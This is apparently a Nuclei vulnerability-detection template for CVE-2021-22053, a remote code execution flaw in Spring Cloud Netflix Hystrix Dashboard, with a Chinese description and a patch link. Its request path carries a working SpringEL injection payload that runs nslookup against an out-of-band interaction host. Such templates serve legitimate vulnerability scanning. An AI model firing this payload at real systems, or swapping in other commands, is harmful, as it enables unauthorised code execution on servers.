id: CVE-2021-22053
info:
  name: RCE through SpringEL expressions in Spring Cloud Netflix Hystrix Dashboard
    < 2.2.10.RELEASE
  author:
  - l0ne1y
  description: |-
    SpringCloud Netflix(VMware)远程代码执行漏洞
    Vmware VMware Spring Cloud Netflix是美国威睿（Vmware）公司的一个服务。通过自动配置和绑定到 Spring Environment 和其他 Spring 编程模型习语，为 Spring Boot 应用程序提供 Netflix OSS 集成。
    VMware Spring Cloud Netflix 存在安全漏洞，该漏洞源于使用spring cloud netflix hystrix dashboard和spring boot starter thymeleaf的应用程序公开了在解析视图模板期间执行请求URI路径中提交的代码的方法。当在/hystrix/monitor上发出请求时；[用户提供的数据]，hystrix/monitor后面的路径元素将作为SpringEL表达式进行计算，这可能导致代码执行。
  severity: high
  remediation: |-
    #### 官方修复方案：
    目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    [https://tanzu.vmware.com/security/cve-2021-22053](https://tanzu.vmware.com/security/cve-2021-22053)
requests:
- matchers:
  - type: status
    status:
    - 500
  - type: word
    part: interactsh_protocol
    words:
    - dns
  matchers-condition: and
  path:
  - '{{BaseURL}}/hystrix/;a=a/__${T (java.lang.Runtime).getRuntime().exec("nslookup
    {{interactsh-url}}")}__::.x/'
  method: GET
